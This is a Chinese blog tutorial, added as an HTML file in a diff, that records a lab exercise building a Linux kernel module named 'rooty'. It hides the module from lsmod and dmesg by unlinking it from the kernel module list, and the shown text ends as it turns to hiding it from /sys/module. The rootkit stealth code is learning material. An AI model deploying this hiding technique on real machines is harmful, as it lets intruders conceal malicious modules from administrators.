@@ -1,0 +1,1062 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="1VSb7KgXA34WGgoVKCCkrkEMjx1Vq8uwVB6FC3iUGV8">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="rootkit,文件隐藏">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="去年实验，一个简单的文件隐藏">
+<meta name="keywords" content="rootkit,文件隐藏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LinuxRootkit学习">
+<meta property="og:url" content="http://yoursite.com/2019/10/12/LinuxRootkit学习/index.html">
+<meta property="og:site_name" content="安和桥南丶的博客">
+<meta property="og:description" content="去年实验，一个简单的文件隐藏">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/.com//figure1.gif">
+<meta property="og:updated_time" content="2019-10-12T13:07:33.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LinuxRootkit学习">
+<meta name="twitter:description" content="去年实验，一个简单的文件隐藏">
+<meta name="twitter:image" content="http://yoursite.com/.com//figure1.gif">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/12/LinuxRootkit学习/">
+
+
+
+
+
+  <title>LinuxRootkit学习 | 安和桥南丶的博客</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-149847357-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">安和桥南丶的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/12/LinuxRootkit学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安河桥南丶">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安和桥南丶的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">LinuxRootkit学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-12T21:07:33+08:00">
+                2019-10-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/10/12/LinuxRootkit学习/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/12/LinuxRootkit学习/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2019/10/12/LinuxRootkit学习/" class="leancloud_visitors" data-flag-title="LinuxRootkit学习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  去年实验，一个简单的文件隐藏
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Linux-Rootkit学习"><a href="#Linux-Rootkit学习" class="headerlink" title="Linux Rootkit学习"></a>Linux Rootkit学习</h1><blockquote>
+<p>本来早就打算做一个这个系列的记录，但是一直都给弃坑了，趁今天老师讲完，自己私下离研究一下，争取弄懂这个知识点。</p>
+<p>实验环境: kali Linux 2019.1</p>
+<p>内核版本: 4.19.0-kali3-amd64</p>
+</blockquote>
+<h2 id="1-LKM内容"><a href="#1-LKM内容" class="headerlink" title="1 LKM内容"></a>1 LKM内容</h2><h3 id="1-1-LKM加载"><a href="#1-1-LKM加载" class="headerlink" title="1.1 LKM加载"></a>1.1 LKM加载</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 一个最简单的系统模块</span></span><br><span class="line"><span class="comment"> * rooty.c</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;	//模块头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;		//使用的宏文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;	//KERN_INFO在这里</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// LICENSE</span></span><br><span class="line">MODULE_LICENSE(<span class="string">"GPL"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作者</span></span><br><span class="line">MODULE_AUTHOR(<span class="string">"chanshaw"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//描述</span></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">"It's a rootkit lkm"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//版本</span></span><br><span class="line">MODULE_VERSION(<span class="string">"0.1"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rooty_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(<span class="string">"rooty: module loaded\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rooty_exit</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    printk(<span class="string">"rooty: module removed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(rooty_init);</span><br><span class="line">module_exit(rooty_exit);</span><br></pre></td></tr></table></figure>
+
+<p>这个模块在初始化的时候，将<code>rooty:module loaded</code>打印到内核缓冲区，并在模块删除的时候，打印<code>rooty: module removed</code>，所以不难理解这个程序主要有两部分代码组成，一部分为<code>module_init(rooty_init)</code>，这个有点想我们面对对象编程的时候写的构造函数，，同样与之对应的是<code>module_exit(rooty_exit)</code>,这个就是于我们的析构函数对应的。</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">obj-m = rooty.o</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build/ M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br><span class="line"><span class="comment"># make命令前是tab，不是空格</span></span><br></pre></td></tr></table></figure>
+
+<p><code>obj-m</code>表示我们正在从对象创建模块，现在可以使用make来编译或者清理用来伤处编译过程中生成的文件。</p>
+<p><strong>编译<code>rooty.c</code>：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit<span class="comment"># make</span></span><br><span class="line">make -C /lib/modules/4.19.0-kali3-amd64/build/ M=/root/Documents/rootkit modules</span><br><span class="line">make[1]: 进入目录“/usr/src/linux-headers-4.19.0-kali3-amd64”</span><br><span class="line">  CC [M]  /root/Documents/rootkit/rooty.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/Documents/rootkit/rooty.mod.o</span><br><span class="line">  LD [M]  /root/Documents/rootkit/rooty.ko</span><br><span class="line">make[1]: 离开目录“/usr/src/linux-headers-4.19.0-kali3-amd64”</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看模块信息：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit<span class="comment"># modinfo rooty.ko</span></span><br><span class="line">filename:       /root/Documents/rootkit/rooty.ko</span><br><span class="line">version:        0.1</span><br><span class="line">description:    It<span class="string">'s a rootkit lkm</span></span><br><span class="line"><span class="string">author:         chanshaw</span></span><br><span class="line"><span class="string">license:        GPL</span></span><br><span class="line"><span class="string">srcversion:     6084592AB4626A083A7446F</span></span><br><span class="line"><span class="string">depends:        </span></span><br><span class="line"><span class="string">retpoline:      Y</span></span><br><span class="line"><span class="string">name:           rooty</span></span><br><span class="line"><span class="string">vermagic:       4.19.0-kali3-amd64 SMP mod_unload modversions</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>模块操作：</strong></p>
+<ul>
+<li><p>加载内核：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit# insmod rooty.ko</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查看系统日志，在这里，我们查看最后10条信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit# dmesg | tail -n 10</span><br><span class="line">[56753.551611] IPv6: ADDRCONF(NETDEV_CHANGE): eth0: link becomes ready</span><br><span class="line">[56753.560390] usb 2-2.1: New USB device found, idVendor=0e0f, idProduct=0008, bcdDevice= 1.00</span><br><span class="line">[56753.560393] usb 2-2.1: New USB device strings: Mfr=1, Product=2, SerialNumber=3</span><br><span class="line">[56753.560396] usb 2-2.1: Product: Virtual Bluetooth Adapter</span><br><span class="line">[56753.560398] usb 2-2.1: Manufacturer: VMware</span><br><span class="line">[56753.560400] usb 2-2.1: SerialNumber: 000650268328</span><br><span class="line">[57731.899954] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd</span><br><span class="line">[60903.403630] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd</span><br><span class="line">[63702.217634] rooty: loading out-of-tree module taints kernel.</span><br><span class="line">[63702.233369] rooty: module loaded</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>查找我们的模块</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit# lsmod |grep rooty</span><br><span class="line">rooty                  16384  0</span><br></pre></td></tr></table></figure>
+
+<p>前者是模块大小，后者是模块使用次数，可以看到，我们的模块大小是16384，一次都未使用</p>
+</li>
+<li><p>卸载模块，再查看系统日志</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit# rmmod rooty.ko</span><br><span class="line">root@kali:~/Documents/rootkit# dmesg | tail -n 10</span><br><span class="line">[56753.560390] usb 2-2.1: New USB device found, idVendor=0e0f, idProduct=0008, bcdDevice= 1.00</span><br><span class="line">[56753.560393] usb 2-2.1: New USB device strings: Mfr=1, Product=2, SerialNumber=3</span><br><span class="line">[56753.560396] usb 2-2.1: Product: Virtual Bluetooth Adapter</span><br><span class="line">[56753.560398] usb 2-2.1: Manufacturer: VMware</span><br><span class="line">[56753.560400] usb 2-2.1: SerialNumber: 000650268328</span><br><span class="line">[57731.899954] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd</span><br><span class="line">[60903.403630] usb 2-2.1: reset full-speed USB device number 7 using uhci_hcd</span><br><span class="line">[63702.217634] rooty: loading out-of-tree module taints kernel.</span><br><span class="line">[63702.233369] rooty: module loaded</span><br><span class="line">[63792.257348] rooty: module removed</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>到此，我们已经了解了有关系统模块的基本操作。</p>
+<h3 id="1-2-隐藏系统模块"><a href="#1-2-隐藏系统模块" class="headerlink" title="1.2 隐藏系统模块"></a>1.2 隐藏系统模块</h3><p>​    现在我们要做的是，虽然这个模块是正常工作的，但是我们要使得它不被别人察觉到，也就是，不管我们是在使用<code>dmesg</code>命令还是<code>lsmod</code>命令，都不会察觉到它。</p>
+<ul>
+<li>对于<code>dmesg</code>命令，只需要简单的不适用<code>printk()</code>函数就好。</li>
+<li>对于<code>lsmod</code>命令，我们在接下的部分进行讨论。</li>
+</ul>
+<p>首先明确的是，我们需要处理的一共有两个位置，第一个是<code>/proc/modules</code>第二个是<code>sys/module/</code>。</p>
+<h3 id="1-2-1-proc-modules隐藏"><a href="#1-2-1-proc-modules隐藏" class="headerlink" title="1.2.1 /proc/modules隐藏"></a>1.2.1 <code>/proc/modules</code>隐藏</h3><p>​    <code>lsmod</code>命令通过<code>/proc/modules</code>中的当前系统模块信息是内核在利用<code>struct modules</code>结构体的表头遍历整个内核模块链表、从所有的模块的<code>struct module</code>结构体总获取模块的相关位置信息得到的.</p>
+<p>​    首先，为了使得在使用<code>lsmod</code>的时候无法找到我们的模块，我们需要知道如下信息：</p>
+<p><code>lsmod</code>命令通过查看<code>/proc/mpdules</code>文件来工作，为此，我们需要在<code>＆__ this_module.list</code>上调用<code>list_del_init</code>方法。这个函数调用<code>__list_del_entry</code>并且是基于<code>__list_del</code>，有关这三个函数的源码都在<code>include/linux/list.h</code>中。源码如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * list_del_init - deletes entry from list and reinitialize it.</span></span><br><span class="line"><span class="comment"> * @entry: the element to delete from the list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del_init</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__list_del_entry(entry);</span><br><span class="line">	INIT_LIST_HEAD(entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * list_del - deletes entry from list.</span></span><br><span class="line"><span class="comment"> * @entry: the element to delete from the list.</span></span><br><span class="line"><span class="comment"> * Note: list_empty() on entry does not return true after this, the entry is</span></span><br><span class="line"><span class="comment"> * in an undefined state.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_del_entry(struct list_head *entry)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!__list_del_entry_valid(entry))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	__list_del(entry-&gt;prev, entry-&gt;next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_del</span><span class="params">(struct list_head *entry)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__list_del_entry(entry);</span><br><span class="line">	entry-&gt;next = LIST_POISON1;</span><br><span class="line">	entry-&gt;prev = LIST_POISON2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在模块删除之后，我们还需要重新初始化这个列表，使用的党法是<code>INIT_LIST_HEAD(entry)</code>,源码很好理解；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">INIT_LIST_HEAD</span><span class="params">(struct list_head *<span class="built_in">list</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	WRITE_ONCE(<span class="built_in">list</span>-&gt;next, <span class="built_in">list</span>); <span class="comment">//list-&gt; next = list;</span></span><br><span class="line">	<span class="built_in">list</span>-&gt;prev = <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>WRITE_ONCE</code>函数在<code>include/linux/compiler.h</code>中，源码如下:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Prevent the compiler from merging or refetching reads or writes. The</span></span><br><span class="line"><span class="comment"> * compiler is also forbidden from reordering successive instances of</span></span><br><span class="line"><span class="comment"> * READ_ONCE and WRITE_ONCE, but only when the compiler is aware of some</span></span><br><span class="line"><span class="comment"> * particular ordering. One way to make the compiler aware of ordering is to</span></span><br><span class="line"><span class="comment"> * put the two invocations of READ_ONCE or WRITE_ONCE in different C</span></span><br><span class="line"><span class="comment"> * statements.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These two macros will also work on aggregate data types like structs or</span></span><br><span class="line"><span class="comment"> * unions. If the size of the accessed data type exceeds the word size of</span></span><br><span class="line"><span class="comment"> * the machine (e.g., 32 bits or 64 bits) READ_ONCE() and WRITE_ONCE() will</span></span><br><span class="line"><span class="comment"> * fall back to memcpy(). There's at least two memcpy()s: one for the</span></span><br><span class="line"><span class="comment"> * __builtin_memcpy() and then one for the macro doing the copy of variable</span></span><br><span class="line"><span class="comment"> * - '__u' allocated on the stack.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Their two major use cases are: (1) Mediating communication between</span></span><br><span class="line"><span class="comment"> * process-level code and irq/NMI handlers, all running on the same CPU,</span></span><br><span class="line"><span class="comment"> * and (2) Ensuring that the compiler does not fold, spindle, or otherwise</span></span><br><span class="line"><span class="comment"> * mutilate accesses that either do not require ordering or that interact</span></span><br><span class="line"><span class="comment"> * with an explicit memory barrier or atomic instruction that provides the</span></span><br><span class="line"><span class="comment"> * required ordering.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WRITE_ONCE(x, val) \</span></span><br><span class="line">(&#123;							\</span><br><span class="line">	<span class="keyword">union</span> &#123; typeof(x) __val; <span class="keyword">char</span> __c[<span class="number">1</span>]; &#125; __u =	\</span><br><span class="line">		&#123; .__val = (__force typeof(x)) (val) &#125;; \</span><br><span class="line">	__write_once_size(&amp;(x), __u.__c, <span class="keyword">sizeof</span>(x));	\</span><br><span class="line">	__u.__val;					\</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>根据源码注释，可知，之所以这么写的原因是为了防止编译器合并或重新读取读取或写入。确保编译器不折叠，主轴或以其他方式破坏不需要排序或与显式内存屏障或提供所需排序的原子指令交互的访问。具体解释在<a href="https://stackoverflow.com/questions/34988277/write-once-in-linux-kernel-lists" target="_blank" rel="noopener">这里</a>。在这里我们只需要简单的知道这部分是双向链表的删除操作就可以。</p>
+<p>​    现在我们将<code>list_del_init(&amp;__this_module.list)；</code>加入到我们的初始化函数中，保存，编译，装载模块，再输入<code>lsmod</code>就会发现找不到我们的模块了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">rooty_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    list_del_init(&amp;__this_module.<span class="built_in">list</span>);</span><br><span class="line">    <span class="comment">//printk("rooty: module loaded\n");</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>效果:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Documents/rootkit# insmod rooty.ko</span><br><span class="line">root@kali:~/Documents/rootkit# lsmod |grep rooty</span><br><span class="line">root@kali:~/Documents/rootkit# modinfo rooty</span><br><span class="line">modinfo: ERROR: Module rooty not found.</span><br><span class="line">root@kali:~/Documents/rootkit# ls /sys/module/ |grep rooty</span><br><span class="line">rooty</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-2-sys-module隐藏"><a href="#1-2-2-sys-module隐藏" class="headerlink" title="1.2.2 sys/module隐藏"></a>1.2.2 <code>sys/module</code>隐藏</h3><p>​    <code>sys/module</code>总有加载内核对象的一般信息（比如参数）。所以通过查看<code>sysfs</code>也就是<code>sys/module</code>目录来发现现有模块是可行的。</p>
+<p>​    <code>sysfs</code>是一个基于<code>ram</code>的文件系统，这个文件系统不仅可以把设备（devices）和驱动程序（drivers）的信息从内核输出到用户空间，也可以用来对设备和驱动程序做设置。通常，<code>sysfs</code>是挂在在/sys目录下的:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t sysfs sysfs /sys</span><br></pre></td></tr></table></figure>
+
+<p>而<code>/sys/module</code>是一个<code>sysfs</code>的一个目录层次, 包含当前加载模块的信息.。<code>sysfs</code>与<code>kobject</code>层次紧密相连，它将<code>kobject</code>层次关系表现出来，使得用户空间可以看见这些层次关系。其中<code>kobj</code>是一个<code>struct kobject</code>结构体，而<code>kobject</code>是组成设备模型的基本结构。</p>
